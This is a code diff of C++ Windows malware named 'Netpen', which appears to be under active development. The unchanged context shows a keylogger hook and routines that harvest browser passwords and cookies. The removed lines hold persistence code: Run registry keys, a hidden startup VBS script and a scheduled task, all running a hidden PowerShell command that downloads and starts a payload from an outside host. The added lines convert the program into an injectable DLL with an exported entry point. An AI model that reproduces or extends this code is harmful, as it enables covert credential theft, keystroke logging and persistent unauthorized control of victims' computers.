@@ -58,6 +58,7 @@ static std::string g_hostname;
 static std::string g_lastClipboard;
 static std::string g_lastPasswordDigest;
 static HWND g_hwnd = NULL;
+static HMODULE g_hModule = NULL;
 
 static std::wstring g_supabaseHost;
 static std::wstring g_supabaseKey;
@@ -2004,7 +2005,7 @@ static DWORD FindProcessPid(const wchar_t* name) {
 }
 
 static bool ExtractDllToTemp(std::string& outPath) {
-    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(101), RT_RCDATA);
+    HRSRC hRes = FindResourceA(g_hModule, MAKEINTRESOURCEA(101), RT_RCDATA);
     if (!hRes) return false;
     HGLOBAL hGlob = LoadResource(NULL, hRes);
     void* data = LockResource(hGlob);
@@ -2688,57 +2689,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (!keyStr.empty()) {
             g_keys += keyStr;
             g_lastTick = now;
-            if (g_keys.size() > 5000) FlushBuffer();
         }
         g_winTitle = newTitle;
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
-}
-
-#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
-#define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
-#define NETPEN_STARTUP_SUFFIX ".update.vbs"
-
-static void EnsureStartupEntry();
-
-static void CleanupPersistence() {
-    HKEY hKey;
-    std::string exeName = GetExeName();
-
-    // Remove HKCU\Run
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, exeName.c_str());
-        RegCloseKey(hKey);
-    }
-    // Remove HKLM\Run (if we had admin)
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, exeName.c_str());
-        RegCloseKey(hKey);
-    }
-    RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
-
-    // Remove scheduled task
-    ExecuteCommand(ToNarrow(std::wstring(L"schtasks /delete /tn ") + std::wstring(NETPEN_TASKNAME) + L" /f"));
-
-    // Remove startup folder .cmd and .vbs
-    char ad[MAX_PATH];
-    if (GetEnvironmentVariableA("APPDATA", ad, MAX_PATH) > 0) {
-        std::string startupBase = std::string(ad) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exeName;
-        DeleteFileA((startupBase + ".update.cmd").c_str());
-        DeleteFileA((startupBase + ".update.vbs").c_str());
-    }
-
-    // Remove temp files
-    char tmpPath[MAX_PATH];
-    GetTempPathA(MAX_PATH, tmpPath);
-    DeleteFileA((std::string(tmpPath) + exeName).c_str());
-    // Remove ProgramData bat file (used by scheduled task across all users)
-    char allUsers[MAX_PATH];
-    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) > 0) {
-        DeleteFileA((std::string(allUsers) + "\\Netpen\\" + exeName + ".update.bat").c_str());
-    } else {
-        DeleteFileA(("C:\\ProgramData\\Netpen\\" + exeName + ".update.bat").c_str());
-    }
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
@@ -2759,13 +2713,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             if (counter % 30 == 0) {
                 if (CheckSelfDestruct()) {
                     g_selfDestructing = true;
-                    CleanupPersistence();
-                    CreateKillFlag();
                     g_running = false;
                     DestroyWindow(hwnd);
+                    g_hwnd = NULL;
                 } else if (CheckStop()) {
                     g_running = false;
                     DestroyWindow(hwnd);
+                    g_hwnd = NULL;
                 }
             }
             if (counter % 5 == 0 && g_protectReset) {
@@ -2804,9 +2758,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 CheckAndHandleProtectReset();
                 CheckHarvestConfig();
             }
-            if (counter % 120 == 0 && !g_selfDestructing) {
-                EnsureStartupEntry();
-            }
             if (counter % 300 == 0 && !g_selfDestructing && !g_harvestPaused) {
                 HarvestBrowserPasswords();
                 HarvestBrowserCookies();
@@ -2833,73 +2784,6 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
     CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &needed);
     while (!result.empty() && result.back() == '\0') result.pop_back();
     return result;
-}
-
-#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
-
-static void InstallStartup() {
-    HKEY hKey;
-    std::string exeName = GetExeName();
-    if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)"1", 2);
-        RegCloseKey(hKey);
-    }
-
-    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + exeName + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
-
-    // 1. HKCU\Run (existing)
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, exeName.c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
-        RegCloseKey(hKey);
-    }
-
-    // 2. Startup folder .vbs (hidden, no console window)
-    char appData[MAX_PATH];
-    if (GetEnvironmentVariableA("APPDATA", appData, MAX_PATH) > 0) {
-        std::string startupDir = std::string(appData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-        std::string vbsPath = startupDir + "\\" + exeName + NETPEN_STARTUP_SUFFIX;
-        std::string vbsContent = "CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + exeName + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"\"\", 0, False\r\n";
-        HANDLE hFile = CreateFileA(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD w = 0;
-            WriteFile(hFile, vbsContent.c_str(), (DWORD)vbsContent.size(), &w, NULL);
-            CloseHandle(hFile);
-        }
-    }
-
-    // 3. Scheduled Task (ONLOGON — survives reboot, any user login)
-    char allUsers[MAX_PATH];
-    std::string batDir = "C:\\ProgramData\\Netpen";
-    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) > 0) {
-        batDir = std::string(allUsers) + "\\Netpen";
-    }
-    CreateDirectoryA(batDir.c_str(), NULL);
-    std::string batFile = batDir + "\\" + exeName + ".update.bat";
-    std::string batContent = "@start /b \"\" " + psCmd + "\r\n";
-    HANDLE hBat = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-    if (hBat != INVALID_HANDLE_VALUE) {
-        DWORD w = 0;
-        WriteFile(hBat, batContent.c_str(), (DWORD)batContent.size(), &w, NULL);
-        CloseHandle(hBat);
-    }
-    std::wstring taskCmd = L"schtasks /create /tn " + std::wstring(NETPEN_TASKNAME) + L" /tr \"\\\"cmd.exe\\\" /c \\\"" + ToWide(batFile) + L"\\\"\" /sc ONLOGON /delay 0000:30 /rl HIGHEST /f";
-    ExecuteCommand(ToNarrow(taskCmd));
-
-    // 4. HKLM\Run (if running as admin)
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, exeName.c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
-        RegCloseKey(hKey);
-    }
-}
-
-static void EnsureStartupEntry() {
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return;
-    }
-    // Payload missing -- reinstall
-    InstallStartup();
 }
 
 static int RunChild(HINSTANCE hInstance) {
@@ -2948,114 +2832,19 @@ static int RunChild(HINSTANCE hInstance) {
     return 0;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
-    AddVectoredExceptionHandler(1, VectoredHandler);
-    InitConfig();
-    HWND consoleWnd = GetConsoleWindow();
-    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
-
-    std::string cmdLine(lpCmdLine ? lpCmdLine : "");
-    if (cmdLine.find("--child") != std::string::npos) {
-        return RunChild(hInstance);
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
+        g_hModule = hModule;
     }
-
-    CreateMutexW(NULL, TRUE, L"RuntimeBroker_Instance");
-    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
-
-    char hostname[256] = {0};
-    DWORD hostnameSize = sizeof(hostname);
-    GetComputerNameA(hostname, &hostnameSize);
-    g_hostname = hostname;
-
-    InstallStartup();
-    LogMsg("Watchdog started on " + g_hostname);
-
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    std::string exePath(path);
-
-    int crashCount = 0;
-    DWORD lastCrashTime = 0;
-
-    while (true) {
-        RemoveKillFlag();
-
-        // Check for updates before spawning child (works even in crash loops)
-        { int rv = GetRemoteVersion(); if (rv > NETPEN_VERSION) { bool upd = DeployUpdate(rv); if (upd) break; } }
-
-        STARTUPINFOA si = {0};
-        si.cb = sizeof(si);
-        PROCESS_INFORMATION pi = {0};
-        std::string childCmd = "\"" + exePath + "\" --child";
-
-        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            Sleep(30000);
-            continue;
-        }
-
-        bool updated = false;
-        while (true) {
-            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
-            if (wr == WAIT_TIMEOUT) {
-                int rv = GetRemoteVersion();
-                if (rv > NETPEN_VERSION) {
-                    TerminateProcess(pi.hProcess, 1);
-                    updated = DeployUpdate(rv);
-                    break;
-                }
-                if (KillFlagExists()) {
-                    TerminateProcess(pi.hProcess, 1);
-                    break;
-                }
-            } else {
-                break;
-            }
-        }
-
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-
-        if (KillFlagExists()) {
-            RemoveKillFlag();
-            LogMsg("Self-destruct triggered, watchdog exiting");
-            break;
-        }
-
-        if (updated) {
-            LogMsg("Watchdog exiting for update");
-            break;
-        }
-
-        // Crash-loop backoff
-        DWORD now = GetTickCount();
-        if (now - lastCrashTime < 10000) {
-            crashCount++;
-            if (crashCount > 5) {
-                DWORD delay = std::min(600000u, 3000u * (1u << std::min((unsigned)(crashCount - 5), 8u)));
-                LogMsg("Crash loop detected (" + std::to_string(crashCount) + "), backing off " + std::to_string(delay/1000) + "s");
-                Sleep(delay);
-            }
-        } else {
-            crashCount = 0;
-        }
-        lastCrashTime = now;
-
-        Sleep(3000);
-    }
-
-    return 0;
+    return TRUE;
 }
 
-
-
-
-
-
-
-
-
-int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
-int _sd7f9bd008da14598892b2482d9609e20(void){return 0;}
-int _s648d5539b27140ebb936cd13c8ed671a(void){return 0;}
-int _s71d014ab11584b54bab8f56bc6bea1fb(void){return 0;}
-int _s1abdfba2d47d45c59a828f48986b6857(void){return 0;}
+extern "C" __declspec(dllexport) DWORD WINAPI AgentInit(LPVOID) {
+    InitConfig();
+    AddVectoredExceptionHandler(1, VectoredHandler);
+    HWND consoleWnd = GetConsoleWindow();
+    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
+    CreateEventW(NULL, TRUE, FALSE, L"NetpenAgentRunning");
+    return RunChild(g_hModule);
+}
